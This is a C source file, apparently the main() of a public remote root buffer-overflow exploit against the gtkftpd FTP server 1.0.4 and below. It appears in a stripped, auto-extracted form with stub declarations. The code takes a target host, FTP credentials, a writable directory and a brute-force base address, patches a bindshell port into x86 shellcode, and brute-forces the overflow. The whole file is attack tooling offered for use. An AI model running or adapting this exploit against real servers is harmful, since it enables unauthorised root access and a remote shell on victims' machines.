#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int DFLADDR ; 
 int DFLCLM ; 
 char* DFLDIR ; 
 char* DFLPASS ; 
 char* DFLUSER ; 
 int EOF ; 
 int /*<<< orphan*/  SIGINT ; 
 int /*<<< orphan*/  SIGPIPE ; 
 int align ; 
 int atoi (scalar_t__) ; 
 int attempts ; 
 int baseaddr ; 
 int columns ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  ftp_connect () ; 
 scalar_t__ getenv (char*) ; 
 int getopt (int,char**,char*) ; 
 char* host ; 
 int no_io ; 
 scalar_t__ optarg ; 
 char* pass ; 
 int port ; 
 int /*<<< orphan*/  printe (char*,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int reverse ; 
 int /*<<< orphan*/  sig_ctrlc ; 
 int /*<<< orphan*/  sig_pipe ; 
 int /*<<< orphan*/  signal (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int sport ; 
 int /*<<< orphan*/  sscanf (scalar_t__,char*,int*) ; 
 scalar_t__ strdup (scalar_t__) ; 
 int /*<<< orphan*/  usage (char*) ; 
 char* user ; 
 char* writedir ; 
 int* x86_exec ; 

int main(int argc,char **argv){
 int chr=0;
 printf("[*] gtkftpd[v1.0.4(and below)]: remote root buffer overflow"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");
 /* set the chomp point, filter long lines. */
 if(getenv("COLUMNS"))columns=atoi(getenv("COLUMNS"));
 if(7>columns||columns>256)columns=DFLCLM;
 while((chr=getopt(argc,argv,"h:P:s:u:p:c:b:a:n:rd"))!=EOF){
  switch(chr){
   case 'h':
    if(!host&&!(host=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'P':
    port=atoi(optarg);
    break;
   case 's':
    sport=atoi(optarg);
    break;
   case 'u':
    if(!user&&!(user=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'p':
    if(!pass&&!(pass=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'c':
    if(!writedir&&!(writedir=(char *)strdup(optarg)))
     printe("main(): allocating memory failed.",1);
    break;
   case 'b':
    sscanf(optarg,"%x",&baseaddr);
    break;
   case 'a':
    align=atoi(optarg);
    break;
   case 'n':
    attempts=atoi(optarg);
    break;
   case 'r':
    reverse=1;
    break;
   case 'd':
    no_io=1;
    break;
   default:
    usage(argv[0]);
    break; 
  }
 }
 if(!host)
  usage(argv[0]);
 /* fill in the blanks, or out of bounds. */
 if(!user)user=DFLUSER;
 if(!pass)pass=DFLPASS;
 if(!writedir)writedir=DFLDIR;
 if(!baseaddr)baseaddr=DFLADDR;
 if(align>3)align=2;
 if(!((sport&0xff00)>>8)||!(sport&0x00ff)){
  printf("[!] shell port defined contains null byte(s), using default.\n");
  sport=7979; /* back to default. */
 }
 /* change the bindshell port. */
 x86_exec[20]=(sport&0xff00)>>8;
 x86_exec[21]=(sport&0x00ff);
 /* verbose. */
 printf("[*] target: %s:%d, identity: %s:%s.\n[*] directory: %s, brute"
 " start: 0x%.8x, alignment: %d.\n[*] memory direction: %s, attempts: "
 "%d, bindshell port: %d.\n\n",host,port,user,pass,writedir,baseaddr,
 align,(!reverse?"downward":"upward"),attempts,sport);
 signal(SIGINT,sig_ctrlc); /* explained/pretty exit. */
 signal(SIGPIPE,sig_pipe); /* handle abnormal disconnects. */
 ftp_connect(); /* do the magic, brute force. */
 printe("brute force exhausted, failed.",0);
 exit(0);
}